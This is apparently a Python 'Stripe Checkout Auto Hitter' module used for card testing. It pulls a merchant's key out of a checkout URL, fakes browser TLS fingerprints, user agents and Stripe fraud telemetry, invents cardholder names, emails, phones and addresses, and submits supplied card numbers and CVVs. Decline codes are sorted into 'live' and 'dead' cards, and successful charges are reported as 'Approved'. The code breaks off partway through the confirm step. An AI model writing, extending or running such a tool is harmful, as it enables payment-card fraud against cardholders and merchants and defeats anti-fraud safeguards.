import random
import re
import json
import base64
import uuid
import hashlib
from urllib.parse import unquote, quote as url_quote
from curl_cffi.requests import AsyncSession

# Browser profiles for TLS fingerprint impersonation (curl_cffi)
# Keyed by browser family so UA and TLS fingerprint stay correlated.
# Validated against curl_cffi 0.14.0 BrowserType enum
_TLS_PROFILES = [
    "chrome131", "chrome124", "chrome123", "chrome120",
    "chrome119", "chrome116", "chrome110", "chrome107",
]
# Flat list for backward compat (used by retrieve_merchant_info)
BROWSER_PROFILES = _TLS_PROFILES

# ── Decline Code → Friendly Message + Status Mapping ──
# status: "live" = card exists (CVV/CCN live), "dead" = card dead, "3ds" = 3DS required
DECLINE_MAP = {
    # ── Live Responses (card is valid) ──
    "incorrect_cvc":        ("Incorrect CVC",               "live"),
    "invalid_cvc":          ("Invalid CVC",                 "live"),
    "insufficient_funds":   ("Insufficient Funds",          "live"),
    "authentication_required": ("3DS Authentication Required", "live"),
    "card_error_authentication_required": ("3DS Required",  "live"),
    "transaction_not_allowed": ("Transaction Not Allowed",  "live"),
    "do_not_honor":         ("Do Not Honor",                "live"),
    "try_again_later":      ("Try Again Later",             "live"),
    "approve_with_id":      ("Approve With ID",             "live"),
    "issuer_not_available": ("Issuer Not Available",        "live"),
    "reenter_transaction":  ("Re-enter Transaction",        "live"),
    "no_action_taken":      ("No Action Taken",             "live"),
    "revocation_of_all":    ("Revocation Of All",           "live"),
    "security_violation":   ("Security Violation",          "live"),

    # ── Dead Responses ──
    "generic_decline":      ("Generic Decline",             "dead"),
    "card_declined":        ("Card Declined",               "dead"),
    "fraudulent":           ("Fraudulent",                  "dead"),
    "lost_card":            ("Lost Card",                   "dead"),
    "stolen_card":          ("Stolen Card",                 "dead"),
    "expired_card":         ("Expired Card",                "dead"),
    "card_not_supported":   ("Card Not Supported",          "dead"),
    "currency_not_supported": ("Currency Not Supported",    "dead"),
    "incorrect_number":     ("Incorrect Card Number",       "dead"),
    "invalid_number":       ("Invalid Card Number",         "dead"),
    "invalid_expiry_month": ("Invalid Expiry Month",        "dead"),
    "invalid_expiry_year":  ("Invalid Expiry Year",         "dead"),
    "invalid_account":      ("Invalid Account",             "dead"),
    "pickup_card":          ("Pickup Card",                 "dead"),
    "restricted_card":      ("Restricted Card",             "dead"),
    "card_velocity_exceeded": ("Card Velocity Exceeded",    "dead"),
    "testmode_charges_only": ("Test Mode Key",              "dead"),
    "api_key_expired":      ("API Key Expired",             "dead"),
    "processing_error":     ("Processing Error",            "dead"),
    "service_not_allowed":  ("Service Not Allowed",         "dead"),
    "card_decline_rate_limit_exceeded": ("Rate Limited",    "dead"),
    "merchant_blacklist":   ("Merchant Blacklist",          "dead"),
    "new_account_information_available": ("New Account Info Available", "dead"),
    "withdrawal_count_limit_exceeded": ("Withdrawal Limit Exceeded", "dead"),

    # ── 3DS Responses ──
    "challenge_required":   ("3DS Challenge Required",      "3ds"),
}


def _classify_decline(decline_code: str, error_code: str, message: str) -> tuple:
    """
    Returns (clean_message, status_type) from Stripe decline info.
    status_type is one of: 'charged', 'live', 'dead', '3ds'
    """
    # Check decline_code first, then error_code
    for code in (decline_code, error_code):
        if code and code in DECLINE_MAP:
            return DECLINE_MAP[code]

    # Fallback: try to detect from message text
    msg_lower = message.lower() if message else ""
    for code, (label, status) in DECLINE_MAP.items():
        if code in msg_lower:
            return label, status

    # Default: return cleaned message
    clean = message.replace("_", " ").strip() if message else "Payment Failed"
    return clean, "dead"



def parse_checkout_url(url: str) -> tuple:
    """
    Parse a Stripe Checkout URL and extract cs_live and pk_live.
    URL format: https://checkout.stripe.com/c/pay/cs_live_xxxxx#encodedHash
    Returns (cs_live, pk_live) or raises ValueError.
    """
    # Extract cs_live from URL path
    cs_match = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]+)', url)
    if not cs_match:
        raise ValueError("Could not find cs_live/cs_test in URL")
    cs_live = cs_match.group(1)

    # Extract pk_live from hash fragment
    # Hash encoding: base64_decode(url_decode(hash)) XOR 5 = JSON with apiKey
    pk_live = None
    if '#' in url:
        hash_frag = url.split('#', 1)[1]
        hash_decoded = unquote(hash_frag)
        try:
            # Add base64 padding
            padded = hash_decoded + '=' * (4 - len(hash_decoded) % 4)
            b64_bytes = base64.b64decode(padded)
            # XOR decode with key 5
            xor_decoded = ''.join(chr(b ^ 5) for b in b64_bytes)
            # Parse JSON
            data = json.loads(xor_decoded)
            pk_live = data.get('apiKey')
        except Exception:
            pass

    if not pk_live:
        raise ValueError("Could not extract pk_live from checkout URL hash")

    return cs_live, pk_live


# Realistic stripe.js versions (keep updated periodically)
STRIPE_JS_VERSIONS = [
    "3.80.0", "3.79.0", "3.78.0", "3.77.0", "3.76.0",
    "3.75.0", "3.74.0", "3.73.0", "3.72.0", "3.71.0",
]

# Salt used by stripe.js
_STRIPE_URL_SALT = "7766e861-8279-424d-87a1-07a6022fd8cd"
# Telemetry tag versions (stripe.js internal build identifiers)
_STRIPE_TELEMETRY_TAGS = ["4.5.43", "4.5.42", "4.5.41", "4.5.40", "4.5.39"]


def _sha256_url_hash(text: str) -> str:
    """SHA-256 hash with stripe.js URL salt, base64url-encoded (matching stripe.js behavior)."""
    if not text:
        return text
    digest = hashlib.sha256((text + _STRIPE_URL_SALT).encode("utf-8")).digest()
    return base64.b64encode(digest).decode().replace("+", "-").replace("/", "_").rstrip("=")


def _build_m_stripe_payload(ua: str, checkout_url: str) -> dict:
    """Build the JSON payload for POST https://m.stripe.com/6.
    This replicates what stripe.js sends to get muid/guid/sid."""
    # Hash the checkout URL (stripe.js hashes page URLs in telemetry)
    url_hash = _sha256_url_hash(checkout_url)
    full_hashed_url = f"https://checkout.stripe.com/{url_hash}"

    # Screen dimensions
    screens = [("1920", "1080"), ("1536", "864"), ("2560", "1440"), ("1440", "900")]
    sw, sh = random.choice(screens)
    color_depth = random.choice(["24", "30"])

    # Canvas fingerprint (realistic binary string)
    canvas_fp = "".join(random.choice("01") for _ in range(55))
    # WebGL renderer hash
    webgl_hash = _random_hex(32)

    timestamp = str(int(random.uniform(1700000000, 1740000000) * 1000))
    session_hash = _sha256_url_hash(timestamp)

    return {
        "v2": 1,
        "id": _random_hex(32),
        "t": random.randint(150, 500),
        "tag": random.choice(_STRIPE_TELEMETRY_TAGS),
        "src": "js",
        "a": {
            "a": {"v": "true", "t": 0},         # cookieEnabled
            "b": {"v": "false", "t": 0},        # webdriver
            "c": {"v": "en-US", "t": 0},        # navigator.language
            "d": {"v": "Win32", "t": 0},        # navigator.platform
            "e": {"v": "Browser PDF plug-in,internal-pdf-viewer,application/pdf,pdf", "t": random.randint(10, 30)},
            "f": {"v": f"{sw}w_{sh}h_{color_depth}d_1r", "t": 0},
            "g": {"v": "1", "t": 0},            # devicePixelRatio
            "h": {"v": "false", "t": 0},
            "i": {"v": "sessionStorage-enabled, localStorage-enabled", "t": random.randint(1, 5)},
            "j": {"v": canvas_fp, "t": random.randint(60, 120)},
            "k": {"v": "", "t": 0},
            "l": {"v": ua, "t": 0},              # user agent
            "m": {"v": "", "t": 0},
            "n": {"v": "false", "t": random.randint(60, 120), "at": 1},
            "o": {"v": webgl_hash, "t": random.randint(60, 120)},
        },
        "b": {
            "a": full_hashed_url,
            "b": full_hashed_url,
            "c": _sha256_url_hash("checkout.stripe.com"),
            "d": "NA",
            "e": "NA",
            "f": False,
            "g": True,
            "h": True,
            "i": ["location"],
            "j": [],
            "n": random.randint(200, 400),
            "u": "checkout.stripe.com",
            "v": "checkout.stripe.com",
            "w": f"{timestamp}:{session_hash}",
        },
        "h": _random_hex(20),
    }


async def _get_stripe_fingerprint(client: AsyncSession, ua: str, cs_live: str) -> dict:
    """Call m.stripe.com/6 to get Stripe-validated muid/guid/sid.
    Falls back to random UUIDs if the request fails."""
    try:
        checkout_url = f"https://checkout.stripe.com/c/pay/{cs_live}"
        payload = _build_m_stripe_payload(ua, checkout_url)
        encoded = base64.b64encode(url_quote(json.dumps(payload), safe="").encode()).decode()

        r = await client.post(
            "https://m.stripe.com/6",
            content=encoded,
            headers={
                "user-agent": ua,
                "content-type": "text/plain;charset=UTF-8",
                "origin": "https://checkout.stripe.com",
                "referer": "https://checkout.stripe.com/",
            },
            timeout=8,
        )
        data = r.json()
        muid = data.get("muid", "")
        guid = data.get("guid", "")
        sid = data.get("sid", "")
        if muid and sid:
            return {
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "time_on_page": str(random.randint(15000, 90000)),
                "pasted_fields": "number",
            }
    except Exception:
        pass

    # Fallback: random UUIDs (will fail surface check on strict merchants)
    return {
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "time_on_page": str(random.randint(15000, 90000)),
        "pasted_fields": "number",
    }


def _random_hex(length: int) -> str:
    chars = "abcdef0123456789"
    return "".join(random.choice(chars) for _ in range(length))


def _random_stripe_ua_tag() -> str:
    """Generate payment_user_agent matching real stripe.js format (hex hash, not semver)."""
    h = _random_hex(10)
    return f"stripe.js/{h}; stripe-js-v3/{h}; checkout"


# ── Dynamic User-Agent generator (~500+ unique combinations) ──
# Chrome major versions with realistic build ranges (major.minor.build.patch)
# Only versions that have a matching curl_cffi impersonate profile
_CHROME_BUILDS = {
    131: (6778, 69, 265),  124: (6367, 60, 170),  123: (6312, 46, 165),
    120: (6099, 62, 200),  119: (6045, 105, 210), 116: (5845, 96, 200),
    110: (5481, 77, 180),  107: (5304, 62, 150),
}

# OS platform strings
_WIN_PLATFORMS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; Win64; x64",  # weighted — most common
    "Windows NT 10.0; Win64; x64",
]
_MAC_PLATFORMS = [
    "Macintosh; Intel Mac OS X 10_15_7",
    "Macintosh; Intel Mac OS X 14_0",
    "Macintosh; Intel Mac OS X 14_4_1",
    "Macintosh; Intel Mac OS X 14_7_1",
    "Macintosh; Intel Mac OS X 15_0",
    "Macintosh; Intel Mac OS X 15_2",
    "Macintosh; Intel Mac OS X 13_6_7",
    "Macintosh; Intel Mac OS X 13_4",
]
_LINUX_PLATFORMS = [
    "X11; Linux x86_64",
    "X11; Ubuntu; Linux x86_64",
]


def _chrome_version_string(major: int) -> str:
    """Generate a realistic full Chrome version like 131.0.6778.139."""
    base_build, patch_min, patch_max = _CHROME_BUILDS.get(major, (6778, 50, 200))
    patch = random.randint(patch_min, patch_max)
    return f"{major}.0.{base_build}.{patch}"


def _generate_browser() -> tuple:
    """Generate a correlated (User-Agent, curl_cffi Chrome profile) pair.
    Chrome-only with varied versions and OS platforms.
    The TLS profile always matches the UA Chrome major version."""
    major = random.choice(list(_CHROME_BUILDS.keys()))
    ver = _chrome_version_string(major)
    platform = random.choice(_WIN_PLATFORMS + _MAC_PLATFORMS + _LINUX_PLATFORMS)
    ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36"
    return ua, f"chrome{major}"


def _generate_user_agent() -> str:
    """Backward-compatible wrapper that returns just the UA string."""
    ua, _ = _generate_browser()
    return ua


def _parse_ua_for_stripe(ua: str) -> dict:
    """Extract OS and browser info from UA string for x-stripe-user-agent header."""
    # OS detection
    if "Macintosh" in ua:
        os_name = "Mac OS"
        m = re.search(r'Mac OS X ([\d_.]+)', ua)
        os_version = m.group(1).replace("_", ".") if m else "10.15.7"
    elif "Linux" in ua:
        os_name = "Linux"
        os_version = ""
    else:
        os_name = "Windows"
        os_version = "10"

    # Browser detection
    if "Firefox/" in ua:
        browser_name = "Firefox"
        m = re.search(r'Firefox/([\d.]+)', ua)
        browser_version = m.group(1) if m else "133.0"
    elif "Edg/" in ua:
        browser_name = "Edge"
        m = re.search(r'Edg/([\d.]+)', ua)
        browser_version = m.group(1) if m else "131.0.0"
    elif "OPR/" in ua:
        browser_name = "Opera"
        m = re.search(r'OPR/([\d.]+)', ua)
        browser_version = m.group(1) if m else "116.0.0.0"
    elif "Version/" in ua and "Safari/" in ua:
        browser_name = "Safari"
        m = re.search(r'Version/([\d.]+)', ua)
        browser_version = m.group(1) if m else "17.6"
    else:
        browser_name = "Chrome"
        m = re.search(r'Chrome/([\d.]+)', ua)
        browser_version = m.group(1) if m else "131.0.0.0"

    return {
        "os_name": os_name,
        "os_version": os_version,
        "browser_name": browser_name,
        "browser_version": browser_version,
    }


def _xor_encode(plaintext: str) -> bytes:
    key = [5]
    result = bytearray()
    for i, ch in enumerate(plaintext):
        result.append(ord(ch) ^ key[i % len(key)])
    return bytes(result)


def _encode_base64_custom(data: bytes) -> str:
    """Return raw base64 — DO NOT pre-URL-encode here.
    curl_cffi's data=dict will URL-encode form values automatically.
    Pre-encoding causes double-encoding (%2F → %252F) which corrupts the checksum."""
    return base64.b64encode(data).decode()


def _get_js_encoded_string(pm_id: str) -> str:
    pm_str = '{"id":"' + pm_id + '"}'
    encoded = _xor_encode(pm_str)
    b64 = _encode_base64_custom(encoded)
    return b64


ADDRESSES = [
    {"street": "3501 S Main St", "city": "Gainesville", "state": "FL", "zip": "32601"},
    {"street": "3501 Main St", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "311 Otter Way", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "1 Saint Agnes St", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "205 Kestrel Ct #205", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "5035 93rd Ave", "city": "Pinellas Park", "state": "FL", "zip": "33782"},
    {"street": "809 Bremen Ave", "city": "Perdido Key", "state": "FL", "zip": "32507"},
    {"street": "635 Orange Ct", "city": "Rockledge", "state": "FL", "zip": "32955"},
    {"street": "4107 78th St W", "city": "Bradenton", "state": "FL", "zip": "34209"},
    {"street": "190 SW 3rd Ct", "city": "Florida City", "state": "FL", "zip": "33034"},
    {"street": "13030 Silver Bay Ct", "city": "Fort Myers", "state": "FL", "zip": "33913"},
]

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph",
    "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth",
    "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew",
    "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth",
    "Alex", "Chris", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor", "Thomas", "Moore",
    "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark",
]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]

# Random US phone numbers for phone_number_collection
PHONE_PREFIXES = [
    "212", "310", "415", "305", "713", "312", "404", "206", "602", "303",
]


def _random_email() -> str:
    name = random.choice(FIRST_NAMES).lower()
    num = random.randint(10, 9999)
    domain = random.choice(EMAIL_DOMAINS)
    return f"{name}{num}@{domain}"


def _random_phone() -> str:
    prefix = random.choice(PHONE_PREFIXES)
    suffix = f"{random.randint(100, 999)}{random.randint(1000, 9999)}"
    return f"+1{prefix}{suffix}"


async def retrieve_merchant_info(cs_live: str, pk_live: str, proxy: str = None) -> dict:
    """
    Retrieve merchant info from Stripe Checkout session init endpoint.
    Returns dict with: merchant, product, price, currency, amount_raw, status_url, _raw_init_data
    """
    info = {
        "merchant": "N/A",
        "product": "N/A",
        "price": "N/A",
        "currency": "usd",
        "amount_raw": 0,
        "status_url": "N/A",
        "error": None,
        "_raw_init_data": None,
    }

    ua = _generate_user_agent()
    browser_locale = "en-US"

    try:
        proxy_dict = {"http": proxy, "https": proxy} if proxy else None
        impersonate = random.choice(BROWSER_PROFILES)
        async with AsyncSession(
            impersonate=impersonate,
            proxies=proxy_dict,
            timeout=20,
            verify=False,
        ) as client:
            r = await client.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
                data={
                    "key": pk_live,
                    "eid": "NA",
                    "browser_locale": browser_locale,
                    "redirect_type": "url",
                },
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": ua,
                    "origin": "https://checkout.stripe.com",
                    "referer": "https://checkout.stripe.com/",
                },
            )
            j = r.json()

            if "error" in j:
                info["error"] = j["error"].get("message", "Unknown error")
                return info

            # Merchant name
            info["merchant"] = j.get("account_settings", {}).get("display_name", "N/A")

            # Currency
            info["currency"] = j.get("currency", "usd")

            # Product name
            invoice = j.get("invoice") or {}
            line_item_group = j.get("line_item_group") or {}
            product_obj = j.get("product") or {}
            inv_lines = (invoice.get("lines") or {}).get("data") or []
            li_items = line_item_group.get("line_items") or []

            if inv_lines:
                info["product"] = ((inv_lines[0].get("price") or {}).get("product") or {}).get("name", "N/A")
            elif li_items:
                info["product"] = li_items[0].get("name", "N/A")
            elif product_obj.get("name"):
                info["product"] = product_obj["name"]

            # Amount — prioritize session-level total (includes tax/shipping/discounts)
            amount = j.get("amount_total") or 0
            if not amount and line_item_group.get("total"):
                amount = line_item_group["total"]
            if not amount and invoice.get("total"):
                amount = invoice["total"]
            if not amount and li_items:
                amount = li_items[0].get("total", 0)

            info["amount_raw"] = amount
            info["price"] = f"{info['currency'].upper()} {int(amount) / 100}"

            # Success URL
            info["status_url"] = j.get("success_url", "N/A")

            # Store raw init data for reuse by stripe_gate
            info["_raw_init_data"] = j

    except Exception as e:
        info["error"] = str(e)[:100]

    # ── Fallback: retry without proxy if proxy failed ──
    if info["error"] and proxy:
        info["error"] = None
        try:
            impersonate = random.choice(BROWSER_PROFILES)
            async with AsyncSession(
                impersonate=impersonate,
                timeout=20,
                verify=False,
            ) as client:
                r = await client.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
                    data={
                        "key": pk_live,
                        "eid": "NA",
                        "browser_locale": "en-US",
                        "redirect_type": "url",
                    },
                    headers={
                        "accept": "application/json",
                        "content-type": "application/x-www-form-urlencoded",
                        "user-agent": _generate_user_agent(),
                        "origin": "https://checkout.stripe.com",
                        "referer": "https://checkout.stripe.com/",
                    },
                )
                j = r.json()

                if "error" in j:
                    info["error"] = j["error"].get("message", "Unknown error")
                    return info

                info["merchant"] = j.get("account_settings", {}).get("display_name", "N/A")
                info["currency"] = j.get("currency", "usd")

                invoice = j.get("invoice") or {}
                line_item_group = j.get("line_item_group") or {}
                product_obj = j.get("product") or {}
                inv_lines = (invoice.get("lines") or {}).get("data") or []
                li_items = line_item_group.get("line_items") or []

                if inv_lines:
                    info["product"] = ((inv_lines[0].get("price") or {}).get("product") or {}).get("name", "N/A")
                elif li_items:
                    info["product"] = li_items[0].get("name", "N/A")
                elif product_obj.get("name"):
                    info["product"] = product_obj["name"]

                # Amount — prioritize session-level total
                amount = j.get("amount_total") or 0
                if not amount and line_item_group.get("total"):
                    amount = line_item_group["total"]
                if not amount and invoice.get("total"):
                    amount = invoice["total"]
                if not amount and li_items:
                    amount = li_items[0].get("total", 0)

                info["amount_raw"] = amount
                info["price"] = f"{info['currency'].upper()} {int(amount) / 100}"
                info["status_url"] = j.get("success_url", "N/A")
                info["_raw_init_data"] = j
        except Exception as e2:
            info["error"] = str(e2)[:100]

    return info


async def stripe_gate(
    cc: str,
    month: str,
    year: str,
    cvv: str,
    cs_live: str,
    pk_live: str,
    proxy: str = None,
    custom_addresses: list = None,
) -> tuple:
    """
    Stripe Checkout Auto Hitter (v2 — fixed confirm + 3DS).
    Returns (status, msg, extra_info_dict).
    Single-session: /init, create PM, /confirm all happen in one AsyncSession.
    Merchant info is returned in the extra dict.
    Pass custom_addresses=[{street,city,state,zip,country}] to override billing.
    """
    fname = random.choice(FIRST_NAMES)
    lname = random.choice(LAST_NAMES)
    email = _random_email()
    phone = _random_phone()
    addr = random.choice(custom_addresses or ADDRESSES)
    ua, impersonate = _generate_browser()
    stripe_tag = _random_stripe_ua_tag()
    version = random.choice(STRIPE_JS_VERSIONS)

    browser_locale = "en-US"
    browser_tz = random.choice(["-300", "-360", "-420", "-480", "-240"])
    browser_color_depth = random.choice(["24", "30", "32"])
    browser_screen_h = random.choice(["864", "1080", "1440"])
    browser_screen_w = random.choice(["1536", "1920", "2560"])

    coname = "Unknown Merchant"
    items = "Unknown Product"
    amount = 0
    amttt = 0
    currency = "usd"
    surl = "N/A"

    extra = lambda **kw: {"merchant": coname, "price": f"{currency.upper()} {amttt}", "product": items, "receipt": surl, **kw}
    max_retries = 1

    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    async with AsyncSession(
        impersonate=impersonate,
        proxies=proxy_dict,
        timeout=15,
        verify=False,
        headers={"user-agent": ua},
    ) as client:

        # Get Stripe-validated fingerprint from m.stripe.com/6
        fingerprint = await _get_stripe_fingerprint(client, ua, cs_live)
        client.cookies.set("__stripe_mid", fingerprint["muid"], domain=".stripe.com")
        client.cookies.set("__stripe_sid", fingerprint["sid"], domain=".stripe.com")

        # ── Step 1: Init Checkout Session (single call per session) ──
        init_checksum = ""
        r1 = None
        _init_err = None
        _needs_phone = False
        _needs_billing_addr = False
        _needs_shipping = False
        _needs_tos = False
        _session_mode = "payment"  # payment / subscription / setup
        _needs_email = False
        _update_ok = None  # None = not attempted, True/False = result
        for attempt in range(max_retries + 1):
            try:
                r1 = await client.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
                    data={
                        "key": pk_live,
                        "eid": "NA",
                        "browser_locale": browser_locale,
                        "redirect_type": "url",
                    },
                    headers={
                        "accept": "application/json",
                        "content-type": "application/x-www-form-urlencoded",
                        "user-agent": ua,
                        "origin": "https://checkout.stripe.com",
                        "referer": "https://checkout.stripe.com/",
                    },
                )
                j1 = r1.json()
            except Exception as exc:
                _init_err = str(exc)[:120]
                j1 = None

            if j1 is None:
                if attempt < max_retries:
                    continue
                detail = r1.text[:120] if r1 else (_init_err or 'Empty')
                return "Dead! ❌", f"Error: {detail}", extra()

            if "error" in j1:
                ec = j1["error"].get("code", "")
                em = j1["error"].get("message", "")
                return "Dead! ❌", f"[ Payment Failed ] » [{ec} » {em}]", extra()

            # Extract merchant info from the single /init response
            init_checksum = j1.get("init_checksum", "")
            coname = j1.get("account_settings", {}).get("display_name", coname)
            currency = j1.get("currency", currency)
            invoice = j1.get("invoice") or {}
            line_item_group = j1.get("line_item_group") or {}
            product_obj = j1.get("product") or {}
            inv_lines = (invoice.get("lines") or {}).get("data") or []
            li_items = line_item_group.get("line_items") or []
            if inv_lines:
                items = ((inv_lines[0].get("price") or {}).get("product") or {}).get("name", items)
            elif li_items:
                items = li_items[0].get("name", items)
            elif product_obj.get("name"):
                items = product_obj["name"]
            # Amount — prioritize session-level total (includes tax/shipping/discounts)
            amount = j1.get("amount_total") or 0
            if not amount and line_item_group.get("total"):
                amount = line_item_group["total"]
            if not amount and invoice.get("total"):
                amount = invoice["total"]
            if not amount and li_items:
                amount = li_items[0].get("total", 0)
            amttt = int(amount) / 100
            surl = j1.get("success_url", surl)

            # ── Detect session mode and optional fields from session config ──
            _session_mode = j1.get("mode", "payment")
            _consent_cfg = (j1.get("consent_collection") or {})
            _needs_tos = _consent_cfg.get("terms_of_service") == "required"

            # Email collection — required when customer_email is not pre-set
            _customer_email = j1.get("customer_email") or ""
            _needs_email = not _customer_email  # if merchant didn't pre-set email, checkout collects it

            # Phone number collection
            _phone_cfg = j1.get("phone_number_collection") or {}
            _needs_phone = _phone_cfg.get("enabled", False)

            # Billing address collection
            _billing_cfg = j1.get("billing_address_collection") or ""
            _needs_billing_addr = (_billing_cfg == "required" or _billing_cfg == "auto")

            # Shipping address collection
            _shipping_cfg = j1.get("shipping_address_collection") or {}
            _needs_shipping = bool(_shipping_cfg.get("allowed_countries"))

            break

        # ── Step 2: Create PaymentMethod (stripe.js Elements flow) ──
        _ua_info = _parse_ua_for_stripe(ua)
        stripe_ua_json = json.dumps({
            "os": {"name": _ua_info["os_name"], "version": _ua_info["os_version"]},
            "browser": {"name": _ua_info["browser_name"], "version": _ua_info["browser_version"]},
            "device": {},
            "bindings_version": f"stripe.js/{version}",
            "lang": "js",
        })
        js_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": ua,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "x-stripe-user-agent": stripe_ua_json,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }

        pm_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "allow_redisplay": "unspecified",
            "billing_details[name]": f"{fname} {lname}",
            "billing_details[email]": email,
            "billing_details[address][country]": addr.get("country", "US"),
            "billing_details[address][line1]": addr["street"],
            "billing_details[address][city]": addr["city"],
            "billing_details[address][postal_code]": addr["zip"],
            "billing_details[address][state]": addr["state"],
            "key": pk_live,
            "payment_user_agent": stripe_tag,
            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_subtype]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "referrer": f"https://checkout.stripe.com/c/pay/{cs_live}",
            "_stripe_version": "2024-06-20",
            **fingerprint,
        }

        # Add phone to PM billing_details if merchant requires it
        if _needs_phone:
            pm_data["billing_details[phone]"] = phone

        direct_pm = None

        for attempt in range(max_retries + 1):
            try:
                r2 = await client.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=pm_data,
                    headers=js_headers,
                )
                j2 = r2.json()
            except Exception:
                if attempt < max_retries:
                    continue
                return "Dead! ❌", "cURL error creating payment method", extra()

            if j2 and j2.get("id"):
                direct_pm = j2["id"]
                break
            else:
                err_obj = (j2.get("error") or {}) if j2 else {}
                err_msg = err_obj.get("message", "")
                dcode = err_obj.get("decline_code", "")
                code = err_obj.get("code", "")

                # Surface blocked → merchant has not enabled raw card tokenization
                if "integration surface" in err_msg.lower() or "tokenization" in err_msg.lower():
                    return "Dead! ❌", "Merchant blocks raw card tokenization (unsupported surface)", extra(decline_code="surface_blocked", stripe_msg=err_msg)

                if err_msg:
                    clean_msg, stype = _classify_decline(dcode, code, err_msg)
                    dc_label = dcode or code or ""
                    if stype == "live":
                        return "Approved! ✅ -» live", clean_msg, extra(decline_code=dc_label, stripe_msg=err_msg)
                    return "Dead! ❌", clean_msg, extra(decline_code=dc_label, stripe_msg=err_msg)
                if "You passed" in str(r2.text) and attempt < max_retries:
                    continue
                return "Dead! ❌", "Payment method creation failed", extra()

        newpm = direct_pm

        # ── Step 2b: Submit customer details via /update (required by some merchants) ──
        _any_details_needed = _needs_email or _needs_phone or _needs_billing_addr or _needs_shipping
        if _any_details_needed:
            update_data = {
                "eid": "NA",
                "key": pk_live,
            }
            # Email
            if _needs_email:
                update_data["email"] = email
            # Phone
            if _needs_phone:
                update_data["phone_number"] = phone
            # Billing address
            if _needs_billing_addr:
                update_data["billing_address[name]"] = f"{fname} {lname}"
                update_data["billing_address[line1]"] = addr["street"]
                update_data["billing_address[city]"] = addr["city"]
                update_data["billing_address[state]"] = addr["state"]
                update_data["billing_address[postal_code]"] = addr["zip"]
                update_data["billing_address[country]"] = addr.get("country", "US")
            # Shipping address (use same address as billing)
            if _needs_shipping:
                update_data["shipping_address[name]"] = f"{fname} {lname}"
                update_data["shipping_address[address][line1]"] = addr["street"]
                update_data["shipping_address[address][city]"] = addr["city"]
                update_data["shipping_address[address][state]"] = addr["state"]
                update_data["shipping_address[address][postal_code]"] = addr["zip"]
                update_data["shipping_address[address][country]"] = addr.get("country", "US")

            update_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": ua,
                "origin": "https://checkout.stripe.com",
                "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
            }
            try:
                r_upd = await client.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs_live}/update",
                    data=update_data,
                    headers=update_headers,
                )
                _update_ok = r_upd.status_code in (200, 201)
            except Exception:
                _update_ok = False
            # Silently continue regardless — the confirm might still work

        # ── Step 3: Confirm Payment ──
        checkout_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": ua,
            "origin": "https://checkout.stripe.com",
            "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }

        js_checksum = _get_js_encoded_string(newpm)

        confirm_data = {
            "eid": "NA",
            "payment_method": newpm,
            "expected_amount": str(amount),
            "expected_payment_method_type": "card",
            "key": pk_live,
            "js_checksum": js_checksum,
        }
        if init_checksum:
            confirm_data["init_checksum"] = init_checksum
        if _needs_tos:
            confirm_data["consent[terms_of_service]"] = "accepted"

        try:
            r3 = await client.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
                data=confirm_data,
                headers=checkout_headers,
            )
            j3 = r3.json()
            r3_text = r3.text
        except Exception:
            return "Dead! ❌", "Confirm request failed", extra()

        surl = j3.get("success_url", surl)
        status3 = j3.get("status")

        # Success detection: only trust status=succeeded
        if status3 == "succeeded":
            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
        if "You passed" in r3_text:
            pass  # fall through to 3DS
        elif '"verification_url": "' in r3_text:
            return "Dead! ❌", "HCAPTCHA Not Bypassed", extra()
        elif not r3_text:
            pass  # fall through
        elif (j3.get("error") or {}).get("message"):
            err = j3.get("error") or {}
            dcode = err.get("decline_code", "")
            code = err.get("code", "")
            msg = err.get("message", "")

